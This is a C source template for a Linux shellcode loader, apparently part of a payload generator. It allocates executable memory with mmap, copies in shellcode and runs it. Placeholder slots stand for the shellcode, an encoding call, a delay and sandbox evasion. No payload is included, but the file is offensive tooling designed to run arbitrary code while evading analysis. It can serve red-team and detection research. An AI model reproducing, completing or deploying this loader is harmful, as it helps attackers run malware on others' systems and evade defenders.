#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

//####INCLUDE####

//####DEFINE####

//####CODE####


void* esc_main(void* lpParameter)
{
    size_t length;
    
    // Replace this with your actual shellcode
    const unsigned char raw[] = ####SHELLCODE####;
    length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
    memcpy(encoded, raw, length);

    //####CALL####
    
    unsigned char* decoded = encoded;

    // Memory allocation using mmap for Linux
    printf("[*] Allocating %lu bytes of memory\n", length);
    void *exec = mmap(0, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec == MAP_FAILED) {
        perror("mmap");
        return (void*)-1;
    }

    // Copy shellcode into allocated memory
    memcpy(exec, decoded, length);

    // Create a function pointer to execute the shellcode
    printf("[*] Executing\n");
    void (*func)();
    func = (void (*)())exec;
    func();

    printf("[+] The shellcode finished executing.\n");

    // Free allocated memory
    munmap(exec, length);
    free(encoded);
    
    return 0;
}

int main()
{
    //####DELAY####
    //####SANDBOXEVASION####
    //####ARGS####

    esc_main(NULL);
}
